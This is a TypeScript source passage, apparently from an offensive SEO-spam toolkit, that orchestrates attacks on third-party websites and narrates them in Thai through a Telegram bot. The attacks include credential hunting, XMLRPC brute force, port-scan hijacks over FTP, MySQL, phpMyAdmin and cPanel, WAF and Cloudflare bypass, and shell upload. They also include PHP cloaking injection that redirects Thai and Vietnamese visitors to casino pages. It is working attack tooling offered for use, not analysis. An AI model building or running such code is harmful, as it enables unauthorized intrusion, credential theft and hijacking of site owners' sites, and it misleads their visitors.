  const reconStep = await narrator.addStep("ตรวจสอบเป้าหมาย + CMS detection");
  
  const { runUnifiedAttackPipeline } = await import("./unified-attack-pipeline");
  
  let lastPhase = "";
  let pipelineResult: any;
  
  try {
    pipelineResult = await runUnifiedAttackPipeline(
      {
        targetUrl: `https://${opts.domain}`,
        redirectUrl: opts.redirectUrl,
        seoKeywords: ["casino", "gambling", "slots"],
        enableCloaking: true,
        enableWafBypass: true,
        enableAltUpload: true,
        enableIndirectAttacks: true,
        enableDnsAttacks: true,
        enableConfigExploit: true,
        enableWpAdminTakeover: true,
        enableWpDbInjection: true,
        enableAiCommander: true,
        enableComprehensiveAttacks: true,
        enablePostUpload: true,
        userId: 1,
        globalTimeout: 10 * 60 * 1000,
      },
      async (event) => {
        // Map pipeline phases to narrator steps
        if (event.phase !== lastPhase) {
          // Complete previous step
          if (lastPhase) {
            await narrator.completeLastStep(
              event.detail.includes("❌") ? "failed" : "done",
              mapPhaseToThaiAnalysis(lastPhase, event.detail)
            );
          }
          
          lastPhase = event.phase;
          const thaiLabel = mapPhaseToThaiLabel(event.phase);
          await narrator.addStep(thaiLabel);
        }
        
        // Add analysis for significant events
        if (event.detail && event.detail.length > 10) {
          const thaiDetail = mapDetailToThai(event.phase, event.detail);
          if (thaiDetail) {
            await narrator.addAnalysis(thaiDetail);
          }
        }
      },
    );
    
    // Complete last step
    if (lastPhase) {
      await narrator.completeLastStep("done");
    }
    
    const verifiedFiles = pipelineResult.uploadedFiles.filter((f: any) => f.redirectWorks && f.redirectDestinationMatch);
    const success = pipelineResult.success || verifiedFiles.length > 0;
    
    // Verification phase
    await narrator.startPhase("verify");
    const verifyStep = await narrator.addStep("ตรวจสอบ redirect ทำงานหรือไม่");
    
    if (verifiedFiles.length > 0) {
      await narrator.updateStep(verifyStep, "done",
        generateVerifyAnalysis({
          redirectWorks: true,
          redirectUrl: verifiedFiles[0].url,
          fileAccessible: true,
        })
      );
    } else {
      await narrator.updateStep(verifyStep, "failed",
        generateVerifyAnalysis({
          redirectWorks: false,
          fileAccessible: pipelineResult.uploadedFiles.length > 0,
        })
      );
    }
    
    // Complete
    const summary = success
      ? `วาง redirect สำเร็จ ${verifiedFiles.length} ไฟล์ จาก ${pipelineResult.uploadAttempts} ครั้ง`
      : `ลองแล้ว ${pipelineResult.uploadAttempts} ครั้ง ไม่สำเร็จ — ${pipelineResult.errors.slice(0, 2).join(", ")}`;
    
    await narrator.complete(success, summary);
    
    return { narrator, success, result: pipelineResult };
    
  } catch (error: any) {
    await narrator.fail(error.message);
    return { narrator, success: false, result: null };
  }
}

/**
 * Run hijack_redirect attack with Thai narration
 */
export async function narrateHijackAttack(opts: NarratedAttackOptions & {
  credentials?: Array<{ username: string; password: string }>;
}): Promise<{
  narrator: TelegramNarrator;
  success: boolean;
  result: any;
}> {
  const narrator = new TelegramNarrator({
    domain: opts.domain,
    method: "hijack_redirect",
    botToken: opts.botToken,
    chatId: opts.chatId,
  });
  
  await narrator.init();
  
  // Phase 1: Credential Hunt
  await narrator.startPhase("credential");
  const credStep = await narrator.addStep("🔑 AI Credential Hunter ค้นหา credentials");
  
  let huntedCreds: Array<{ username: string; password: string }> = opts.credentials || [];
  
  if (!opts.credentials?.length) {
    try {
      const { executeCredentialHunt } = await import("./ai-credential-hunter");
      const huntResult = await executeCredentialHunt({
        domain: opts.domain,
        maxDurationMs: 45_000,
        onProgress: async (phase, detail) => {
          // Add sub-steps for each credential hunting technique
          await narrator.addStep(`🔑 ${detail.substring(0, 60)}`);
        },
      });
      
      huntedCreds = huntResult.credentials.slice(0, 100).map(c => ({ username: c.username, password: c.password }));
      
      await narrator.completeLastStep("done",
        generateCredentialAnalysis({
          usersFound: huntResult.enumeratedUsers,
          techniquesUsed: huntResult.techniques.length,
          techniquesSucceeded: huntResult.techniques.filter(t => t.status === "success").length,
          credentialsFound: huntResult.credentials.length,
        }),
        Date.now() - narrator.getElapsed()
      );
    } catch (err: any) {
      await narrator.updateStep(credStep, "failed", `CredHunter error: ${err.message}`);
    }
  } else {
    await narrator.updateStep(credStep, "done", `ใช้ ${huntedCreds.length} credentials ที่มีอยู่แล้ว`);
  }
  
  // Phase 2: Port Scan + Hijack
  await narrator.startPhase("hijack");
  const scanStep = await narrator.addStep("🔌 สแกนพอร์ต (FTP, MySQL, PHPMyAdmin, cPanel)");
  
  try {
    const { executeHijackRedirect } = await import("./hijack-redirect-engine");
    
    const hijackResult = await executeHijackRedirect({
      targetDomain: opts.domain,
      newRedirectUrl: opts.redirectUrl,
      credentials: huntedCreds.length > 0 ? huntedCreds : undefined,
    }, async (phase, detail, methodIndex, totalMethods) => {
      // Add step for each method tried
      const methodLabel = mapHijackMethodToThai(phase);
      await narrator.addStep(`${methodLabel}: ${detail.substring(0, 60)}`);
    });
    
    // Complete scan step with port info
    const p = hijackResult.portsOpen;
    await narrator.updateStep(scanStep, "done",
      generateReconAnalysis({
        openPorts: [
          ...(p.ftp ? [21] : []),
          ...(p.mysql ? [3306] : []),
          ...(p.pma ? [8080] : []),
          ...(p.cpanel ? [2083] : []),
        ],
      })
    );
    
    // Log each method result
    for (const mr of hijackResult.methodResults) {
      await narrator.addStep(
        `${mr.success ? "✅" : "❌"} ${mapHijackMethodToThai(mr.method)}`
      );
      await narrator.completeLastStep(
        mr.success ? "done" : "failed",
        generateHijackAnalysis({
          method: mr.methodLabel,
          success: mr.success,
          detail: mr.detail.substring(0, 80),
        }),
        mr.durationMs
      );
    }
    
    // Complete
    const summary = hijackResult.success
      ? `Hijack สำเร็จด้วย ${hijackResult.winningMethod} — redirect ไป ${opts.redirectUrl}`
      : `ลอง ${hijackResult.methodResults.length} วิธี ไม่สำเร็จ`;
    
    await narrator.complete(hijackResult.success, summary);
    
    return { narrator, success: hijackResult.success, result: hijackResult };
    
  } catch (error: any) {
    await narrator.fail(error.message);
    return { narrator, success: false, result: null };
  }
}

/**
 * Run scan_only with Thai narration
 */
export async function narrateScanAttack(opts: Omit<NarratedAttackOptions, "redirectUrl">): Promise<{
  narrator: TelegramNarrator;
  success: boolean;
  result: any;
}> {
  const narrator = new TelegramNarrator({
    domain: opts.domain,
    method: "scan_only",
    botToken: opts.botToken,
    chatId: opts.chatId,
  });
  
  await narrator.init();
  await narrator.startPhase("recon");
  
  const step1 = await narrator.addStep("ตรวจสอบ HTTP response + headers");
  const step2Idx = -1;
  
  try {
    const { analyzeDomain } = await import("./seo-engine");
    const s1 = Date.now();
    const analysis = await analyzeDomain(opts.domain, "gambling");
    const dur = Date.now() - s1;
    
    await narrator.updateStep(step1, "done",
      generateReconAnalysis({
        httpStatus: 200,
        isWordPress: undefined,
      }),
      dur
    );
    
    // Step 2: WP endpoints
    const step2 = await narrator.addStep("ตรวจสอบ WP endpoints (xmlrpc, REST API, wp-admin)");
    await narrator.updateStep(step2, "done",
      `DA:${analysis.currentState.estimatedDA} | DR:${analysis.currentState.estimatedDR} | Backlinks:${analysis.currentState.estimatedBacklinks}`
    );
    
    // Step 3: Index check
    const step3 = await narrator.addStep("ตรวจสอบ Google Index");
    await narrator.updateStep(step3, "done",
      `Indexed: ${analysis.currentState.isIndexed ? "✅ อยู่ใน Google" : "❌ ไม่อยู่ใน Google"}`
    );
    
    // Analysis
    await narrator.addAnalysis(
      `พบว่าเว็บไซต์ ${opts.domain} มี DA=${analysis.currentState.estimatedDA} DR=${analysis.currentState.estimatedDR} ` +
      `มี backlinks ประมาณ ${analysis.currentState.estimatedBacklinks} ` +
      `${analysis.currentState.isIndexed ? "อยู่ใน Google index แล้ว" : "ยังไม่อยู่ใน Google index"} ` +
      `ควรตรวจสอบเพิ่มเติมว่าใช้ CMS อะไร เพื่อเลือกวิธีโจมตีที่เหมาะสม`
    );
    
    await narrator.complete(true,
      `Scan เสร็จ: DA=${analysis.currentState.estimatedDA} DR=${analysis.currentState.estimatedDR} BL=${analysis.currentState.estimatedBacklinks}`
    );
    
    return { narrator, success: true, result: analysis };
    
  } catch (error: any) {
    await narrator.fail(error.message);
    return { narrator, success: false, result: null };
  }
}

/**
 * Run cloaking_inject with Thai narration
 */
export async function narrateCloakingAttack(opts: NarratedAttackOptions): Promise<{
  narrator: TelegramNarrator;
  success: boolean;
  result: any;
}> {
  const narrator = new TelegramNarrator({
    domain: opts.domain,
    method: "cloaking_inject",
    botToken: opts.botToken,
    chatId: opts.chatId,
  });
  
  await narrator.init();
  
  // Phase 1: Prepare
  await narrator.startPhase("inject", "💊 PHP Cloaking Injection");
  const prepStep = await narrator.addStep("เตรียม redirect URL + external JS");
  await narrator.updateStep(prepStep, "done", `Redirect: ${opts.redirectUrl.substring(0, 50)}`);
  
  // Phase 2: Inject
  const injectStep = await narrator.addStep("Inject Accept-Language cloaking code");
  
  try {
    const { executePhpInjectionAttack } = await import("./wp-php-injection-engine");
    
    const injectionResult = await executePhpInjectionAttack({
      targetUrl: `https://${opts.domain}`,
      redirectUrl: opts.redirectUrl,
      targetLanguages: ["th", "vi"],
      brandName: "casino",
    }, async (detail) => {
      await narrator.addStep(detail.substring(0, 60));
    });
    
    // Update inject step
    await narrator.updateStep(injectStep, injectionResult.success ? "done" : "failed",
      `Method: ${injectionResult.method} | ${injectionResult.details.substring(0, 60)}`
    );
    
    // Verification
    if (injectionResult.verificationResult) {
      await narrator.startPhase("verify");
      const verifyStep = await narrator.addStep("ตรวจสอบ cloaking ทำงานหรือไม่");
      const v = injectionResult.verificationResult;
      await narrator.updateStep(verifyStep, v.cloakingWorks ? "done" : "failed",
        generateVerifyAnalysis({
          redirectWorks: v.redirectWorks,
          cloakingWorks: v.cloakingWorks,
          normalSiteWorks: v.normalSiteWorks,
        })
      );
    }
    
    const summary = injectionResult.success
      ? `Cloaking inject สำเร็จด้วย ${injectionResult.method}`
      : `ลอง inject ไม่สำเร็จ: ${injectionResult.errors.slice(0, 2).join(", ")}`;
    
    await narrator.complete(injectionResult.success, summary);
    
    return { narrator, success: injectionResult.success, result: injectionResult };
    
  } catch (error: any) {
    await narrator.fail(error.message);
    return { narrator, success: false, result: null };
  }
}

// ═══════════════════════════════════════════════════════
//  Helper Functions
// ═══════════════════════════════════════════════════════

function formatDurationThai(ms: number): string {
  if (ms < 1000) return `${ms}ms`;
  if (ms < 60000) return `${(ms / 1000).toFixed(1)}s`;
  const mins = Math.floor(ms / 60000);
  const secs = Math.round((ms % 60000) / 1000);
  return `${mins}m ${secs}s`;
}

function buildSpinner(elapsed: number): string {
  const frames = ["◐", "◓", "◑", "◒"];
  return frames[Math.floor(elapsed / 500) % frames.length];
}

function sleep(ms: number): Promise<void> {
  return new Promise(resolve => setTimeout(resolve, ms));
}

function mapPhaseToThaiLabel(phase: string): string {
  const map: Record<string, string> = {
    ai_analysis: "🤖 AI วิเคราะห์เป้าหมาย",
    prescreen: "🔍 Pre-screen ตรวจสอบเบื้องต้น",
    vuln_scan: "🔎 สแกนช่องโหว่",
    shell_gen: "🛠 สร้าง Shell/Payload",
    upload: "📤 อัปโหลดไฟล์",
    verify: "✅ ตรวจสอบผลลัพธ์",
    complete: "🏁 เสร็จสิ้น",
    error: "❌ ข้อผิดพลาด",
    waf_bypass: "🛡 Bypass WAF/Firewall",
    alt_upload: "📤 อัปโหลดทางเลือก",
    indirect: "🔄 โจมตีทางอ้อม",
    dns_attack: "🌐 DNS Attack",
    config_exploit: "⚙️ อ่าน wp-config.php",
    recon: "🔍 สำรวจเป้าหมาย",
    cloaking: "🎭 Cloaking Injection",
    wp_admin: "🔐 WP Admin Takeover",
    wp_db_inject: "💉 WP Database Injection",
    wp_brute_force: "🔨 WP Brute Force",
    post_upload: "📝 Post Upload",
    comprehensive: "💥 Comprehensive Attack",
    smart_fallback: "🧠 Smart Fallback",
    cf_bypass: "☁️ Cloudflare Bypass",
    shellless: "🚫 Shellless Attack",
    email: "📧 Email Attack",
    world_update: "🌍 World Update",
    shodan_scan: "🔍 Shodan Port Scan",
    ftp_upload: "📂 FTP Upload",
    ssh_upload: "🔐 SSH/SFTP Upload",
    leakcheck_cred: "🔓 LeakCheck Credentials",
    iis_cloaking: "🖥️ IIS UA Cloaking",
    competitor_analysis: "🔬 Competitor Analysis",
    competitor_overwrite: "🎯 Competitor Overwrite",
    deep_overwrite: "🎯 Deep Overwrite",
    cf_takeover: "☁️ Cloudflare Takeover",
    registrar_takeover: "🌐 DNS Registrar Takeover",
    ai_brain: "🧠 AI Strategy Brain",
  };
  return map[phase] || `📋 ${phase}`;
}

function mapPhaseToThaiAnalysis(phase: string, detail: string): string {
  // Extract key info from detail and translate to Thai
  if (detail.includes("✅") || detail.includes("success")) {
    return `สำเร็จ: ${detail.replace(/[✅❌⚠️🆘]/g, "").trim().substring(0, 100)}`;
  }
  if (detail.includes("⚠️") && (detail.includes("fallback") || detail.includes("ดำเนินการต่อ"))) {
    return `⚠️ ${detail.replace(/[✅❌⚠️🆘]/g, "").trim().substring(0, 100)}`;
  }
  if (detail.includes("🆘")) {
    return `🆘 ${detail.replace(/[✅❌⚠️🆘]/g, "").trim().substring(0, 100)}`;
  }
  if (detail.includes("❌") || detail.includes("fail") || detail.includes("error")) {
    return `ไม่สำเร็จ: ${detail.replace(/[✅❌]/g, "").trim().substring(0, 100)}`;
  }
  return detail.substring(0, 100);
}

function mapDetailToThai(phase: string, detail: string): string | null {
  // Only generate analysis for significant events
  if (detail.length < 15) return null;
  
  // Translate common patterns
  if (detail.includes("WordPress")) {
    if (detail.includes("detected") || detail.includes("found")) {
      return "พบว่าเว็บไซต์ใช้ WordPress — เหมาะสำหรับการโจมตีด้วย XMLRPC multicall และ REST API";
    }
    if (detail.includes("not found") || detail.includes("not detected")) {
      return "ไม่พบ WordPress — ต้องใช้วิธีโจมตีแบบอื่น";
    }
  }
  
  if (detail.includes("WAF") || detail.includes("firewall")) {
    return "ตรวจพบ WAF/Firewall — กำลังใช้เทคนิค bypass";
  }
  
  if (detail.includes("upload") && detail.includes("success")) {
    return "อัปโหลดไฟล์สำเร็จ — กำลังตรวจสอบว่า redirect ทำงานหรือไม่";
  }
  
  if (detail.includes("brute") && detail.includes("found")) {
    return "พบรหัสผ่าน! กำลังเข้าสู่ระบบและวางไฟล์ redirect";
  }
  
  if (detail.includes("Cloudflare")) {
    return "เว็บอยู่หลัง Cloudflare — ต้องใช้เทคนิค bypass พิเศษ";
  }
  
  // Return null for non-significant events
  return null;
}

function mapHijackMethodToThai(method: string): string {
  const map: Record<string, string> = {
    xmlrpc_brute: "🔨 XMLRPC Brute Force",
    rest_api_editor: "📝 REST API Theme Editor",
    phpmyadmin: "🗄 PHPMyAdmin",
    mysql_direct: "💾 MySQL Direct",
    ftp_access: "📁 FTP Access",
    cpanel_filemanager: "🖥 cPanel File Manager",
  };
  return map[method] || method;
}
